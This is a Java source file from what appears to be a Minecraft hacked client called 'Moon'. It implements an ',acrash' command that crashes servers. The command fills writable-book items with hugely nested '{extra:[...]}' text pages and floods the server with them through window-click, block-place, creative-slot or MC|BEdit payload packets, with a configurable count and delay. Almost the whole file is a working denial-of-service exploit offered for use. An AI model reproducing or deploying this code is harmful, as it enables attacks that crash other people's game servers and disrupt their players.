package Moon.command.impl;

import Moon.Moon;
import Moon.command.Command;
import Moon.command.CommandInfo;
import Moon.helpers.ChatHelper;
import Moon.managers.FileManager;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandException;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.BlockPos;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;

@CommandInfo(
        alias = "acrash",
        usage = ",acrash <args/help>",
        aliases = {"advancedcrash", "supercrash", "scrash"}
)
public class AdvancedCrashCommand extends Command {

    public static List<String> methods = new ArrayList<>();

    public void execute(String... args) throws CommandException {
        if (!Moon.INSTANCE.authorised)
            System.exit(0);
        if (args.length <= 0) {
            throw new CommandException("Correct usage&8: &f" + this.getUsage());
        }
        switch (args[0]) {
            case "send":
                if (args.length != 3) {
                    throw new CommandException("Correct usage&8: &f" + this.getUsage());
                }
                if (!(new File("data", args[1] + ".txt").exists()) || args[1].equalsIgnoreCase("saved")) {
                    ChatHelper.sendMessage("Method doesn't exist!");
                    return;
                }
                try {
                    final Scanner _scanner = new Scanner(new File("data", args[1] + ".txt"));
                    String packetName = args[1].substring(0, 1).toUpperCase() + args[1].toLowerCase().substring(1);
                    while (_scanner.hasNext()) {
                        final String[] _split = _scanner.next().split(":", 4);
                        int packets = Integer.parseInt(args[2]);
                        int delay = Integer.parseInt(_split[3]);
                        long start = System.currentTimeMillis();
                        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), packetName + " method started!", 4));
                        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", _split[0].toUpperCase(), packets));
                        (new Thread(() -> {
                            try {
                                for (int c = 0; c < packets; c++) {
                                    NBTTagCompound comp = new NBTTagCompound();
                                    NBTTagList list = new NBTTagList();
                                    for (int i = 0; i < Integer.parseInt(_split[2]); i++)
                                        list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
                                    comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                                    comp.setString("title", "Moon");
                                    comp.setByte("resolved", (byte) 1);
                                    comp.setTag("pages", list);
                                    ItemStack stack = new ItemStack(Items.writable_book);
                                    stack.setTagCompound(comp);
                                    PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                                    buffer.writeItemStackToBuffer(stack);
                                    switch (_split[1]) {
                                        case "windowclick":
                                            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
                                            break;
                                        case "blockplace":
                                            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, stack, 0.0F, 0.0F, 0.0F));
                                            break;
                                        case "creativeslot":
                                            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(1, stack));
                                            break;
                                        case "cpayload":
                                            PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                                            pb.writeItemStackToBuffer(stack);
                                            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", pb));
                                            break;
                                    }
                                    if (delay > 0)
                                        Thread.sleep(delay);
                                }
                            } catch (InterruptedException ignored) {
                            }
                        })).start();
                        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
                    }
                    _scanner.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            case "list":
                if (args.length != 1) {
                    throw new CommandException("Correct usage&8: &f" + this.getUsage());
                }
                methods.clear();
                File folder = new File("data");
                File[] listOfFiles = folder.listFiles();
                for (int i = 0; i < Objects.requireNonNull(listOfFiles).length; i++) {
                    if (listOfFiles[i].isFile() && !listOfFiles[i].getName().equalsIgnoreCase("saved.txt")) {
                        methods.add(listOfFiles[i].getName());
                    }
                }
                ChatHelper.sendMessage("Your methods&8: &f" + methods.toString().replace("[", "").replace("]", "").toUpperCase().replace(".TXT", "").replace("SAVED", ""));
                break;
            case "help":
                if (args.length != 1) {
                    throw new CommandException("Correct usage&8: &f" + this.getUsage());
                }
                ChatHelper.sendMessage(",acrash help", true);
                ChatHelper.sendMessage(",acrash &7create <method> <packet> <book> &7<pages> &7<delay>", true);
                ChatHelper.sendMessage(",acrash &7delete <method>", true);
                ChatHelper.sendMessage(",acrash list", true);
                ChatHelper.sendMessage(",acrash send <method> <amount>", true);
                ChatHelper.sendMessage(" ", false);
                ChatHelper.sendMessage("Available packets&8: &fcpayload/blockplace/windowclick/creativeslot", true);
                break;
            case "delete":
                if (args.length != 2) {
                    ChatHelper.sendMessage("Please choose method to delete!", true);
                    return;
                }
                File _file = new File("data\\" + args[1] + ".txt");
                if (_file.exists()) {
                    _file.delete();
                    methods.remove(args[1] + ".txt");
                }
                break;
            case "create":
                if (args.length != 5) {
                    throw new CommandException("Correct usage&8: &f" + this.getUsage());
                }
                switch (args[2]) {
                    case "cpayload": {
                        FileManager.addCrash(args[1], "cpayload", Integer.valueOf(args[3]), Integer.valueOf(args[4]));
                        break;
                    }
                    case "blockplace": {
                        FileManager.addCrash(args[1], "blockplace", Integer.valueOf(args[3]), Integer.valueOf(args[4]));
                        break;
                    }
                    case "windowclick": {
                        FileManager.addCrash(args[1], "windowclick", Integer.valueOf(args[3]), Integer.valueOf(args[4]));
                        break;
                    }
                    case "creativeslot": {
                        FileManager.addCrash(args[1], "creativeslot", Integer.valueOf(args[3]), Integer.valueOf(args[4]));
                        break;
                    }
                    default: {
                        throw new CommandException("Correct usage&8: &f" + this.getUsage());
                    }

                }
                ChatHelper.sendMessage("&7Method successfully created! &8(&f" + args[1].toUpperCase() + "&8)");
        }
    }
}
